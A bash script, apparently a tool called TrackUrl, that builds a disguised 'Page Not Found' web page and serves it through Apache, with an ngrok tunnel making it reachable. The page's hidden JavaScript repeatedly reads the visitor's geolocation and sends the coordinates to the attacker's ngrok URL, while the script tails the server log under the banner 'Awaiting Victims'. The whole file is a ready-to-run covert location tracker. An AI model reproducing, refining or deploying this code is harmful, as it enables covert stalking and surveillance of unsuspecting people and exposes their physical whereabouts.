#!/bin/bash

echo "[Starting Ngrok]"
sleep 2
# run ngrok server
xterm -e ./ngrok http 4444 & clear
sleep 5

link=$(curl --silent --max-time 10 --connect-timeout 5 --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
varurl=$(echo "https://${link}" &)
echo "URL: ${varurl}"

echo "<!DOCTYPE html>
<html>
    <head>
        <title>Page Not Found</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"https://raw.githubusercontent.com/Kihyu/TrackUrl/master/Screenshot_20200814-195844_Google.jpg\");
                background-size: 1650px 1150px;
                background-repeat: no-repeat;
            }
        </style>
    </head>
    <body>
        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }
        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });
        </script>
    </body>
</html>" > index.html

# move webpage to html directory
mv index.html /var/www/html

echo "[Starting Apache Server]"
sleep 2
# start apache2
service apache2 start & clear

echo "Awaiting Victims" > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
